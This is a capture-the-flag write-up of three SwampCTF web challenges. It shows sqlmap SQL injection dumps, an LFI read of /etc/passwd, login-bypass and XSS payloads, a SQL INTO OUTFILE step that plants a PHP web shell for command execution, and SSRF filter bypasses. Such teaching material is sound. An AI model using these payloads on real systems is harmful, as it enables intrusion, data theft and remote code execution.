#### BrailleDB-1

![[Pasted image 20240407223118.png]]

Try to input single quote and it gives us an error

```asciidoc
<br />
<b>Fatal error</b>: Uncaught PDOException: SQLSTATE[42601]: Syntax error: 7 ERROR: unterminated quoted string at or near &quot;'''&quot;
LINE 1: ...CT braille_representation FROM braille WHERE character = '''
^ in /var/www/html/api/braille.php:33
Stack trace:
#0 /var/www/html/api/braille.php(40): charToBraille(''')
#1 {main}
thrown in <b>/var/www/html/api/braille.php</b> on line <b>33</b><br />
```

We may have SQL injection, copy the request and save it in file, lets name it req.txt and run sqlmap on it

```shell
sqlmap -r req.txt --batch --dbs --level 3
```

```shell
[*] information_schema
[*] pg_catalog
[*] public
```

We get few database names, the one we are interested in is 'public', now enumerate the tables in the database 'public'

```shell
sqlmap -r req.txt -D public --tables --batch --level 3
```

```shell
+----------+
| braille  |
| feedback |
| flag     |
+----------+
```

We want to dump the data of table 'flag'

```shell
sqlmap -r req.txt -D public -T flag --batch --dump-all --level 3
```

And we get the flag
**_flag : swampCTF{Un10n_A11_Th3_W4yyy!}_**

---

#### UnderConstruction

Visit the given web page and in front of us we see

![[Pasted image 20240407223140.png]]

So there is a page query parameter and it id loading a page based on the name given to it, the first thing that comes to my mind is LFI so lets try adding basic LFI payload, generally the websites are hosted from /var/www/html so we need to go back atleast 3 directories

```url
http://chals.swampctf.com:60310/?page=../../../etc/passwd
```

And we get the response

```http
HTTP/1.1 200 OK
Date: Sun, 07 Apr 2024 17:04:27 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 978
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

So there is only one user that is the root user

The hint given to us is that we have to chain 2 vulnerabilities so lets see if we can find another one as well. We can see that there is an option of Admin login lets click on that

![[Pasted image 20240407223618.png]]

Again the file being loaded using the page parameter and we know we have LFI
Lets try SQL injection on the login form

```SQL
username: admin' or 1=1-- -
password: randomData
```

And we get login successful

![[Pasted image 20240407223818.png]]

We can also see that whatever we type is being reflected back so we may also have reflected XSS, we can try that too

```SQL
username: admin' or 1=1-- -<script>alert(10)</script>
password : asdf
```

And we get a pop up

![[Pasted image 20240407224140.png]]

This is although useless but good to try and find other vulnerabilities as well for practice

Now we need to chain SQL injection and LFI, how can we do that?

Lets try using SQL Union queries and find the number of columns

```SQL
username: a' or 1=1 union select 1 from information_schema.tables-- -
password: asdf
```

It gives back the response

![[Pasted image 20240407224544.png]]

```text
Login failed! Please try again.
The used SELECT statements have a different number of columns
```

Lets try with 2 columns

```SQL
a' or 1=1 union select 1,2 from information_schema.tables-- -
```

Still Login failed
Now with 3 columns

```sh
a' or 1=1 union select 1,2,3 from information_schema.tables-- -
```

And we get a successful login

![[Pasted image 20240407224736.png]]

```asciidoc
Login successful! Welcome back, a' or 1=1 union select 1,2,3 from information_schema.tables-- -!
```

The next step was new to me. The thing is even though it shows login successful, nothing changes, no cookie is set whatsoever nor does the previous page which had site under construction changes so we need to do something with just the SQL commands.
First I try to figure out the version of SQL and more information about the database
using sqlmap, we can also do it manually

I found this

```asciidoc
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```

This step is where it gets interesting, these is a command called `into outfile`

This is what the official documentation says

``SELECT INTO OUTFILE` writes the resulting rows to a file, and allows the use of column and row terminators to specify a particular output format.`

You can read more about it on [Into Outfile](https://mariadb.com/kb/en/select-into-outfile/)

Basically we want to write to a file then open it using LFI, in that file we pass command injection payload like

```php
<?php system($_GET['cmd']);?>
```

Since the server is running on php, this should work
Here is what our SQL query will look like

```SQL
' union select null,null,"<?php system($_GET['cmd']);?>" into outfile "/tmp/command.php"-- -
```

![[Pasted image 20240407232425.png]]

We will get a login failed but that doesnt matter
Now all we have to do is open this file using LFI and add query parameter `cmd` to the request, this is how our request will look like

```url
http://chals.swampctf.com:60310/?page=../../../tmp/command.php&cmd=id
```

![[Pasted image 20240407232503.png]]

We pass `ls` to command parameter and find out that the name of file is `super_secret_flag_plz_no_read.txt`

![[Pasted image 20240407232545.png]]

Lets do

```url
http://chals.swampctf.com:60310/?page=../../../tmp/command.php&cmd=cat%20%20super_secret_flag_plz_no_read.txt
```

And we get the flag

![[Pasted image 20240407232639.png]]

**_flag : swampCTF{ch4ining_Vu1ns_I5_Pr3tty_C0Ol}_**

---

#### MemeGenerator

- Looking around the website the most interesting features are to create a meme, and to load in a custom image

- When you load an image from a URL it makes a POST request to loadImages, with the payload `{imageURL: INPUT}`
        - Something like this is potentially vulnerable to SSRF

- If you set the URL to be \https://example.com, the response returned is what you would get if you make a request to \https://example.com directly

- Trying \http://localhost:5000 to see what the developers may be exposing locally, you get the error "Your request was blocked for security reasons
        - A cheat sheet like this has resources on how to bypass this filter: \https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

- Trying \http://127.1:5000 bypasses the filter, but we see the same landing page

- Doing a dirb on the website reveals that there is a page /admin, that returns a 403, but maybe not on localhost

- Doing SSRF with \http://127.1:5000/admin gives you the security error again

- The payload \http://127.1:5000/%61dmin byasses this payload and you get the flag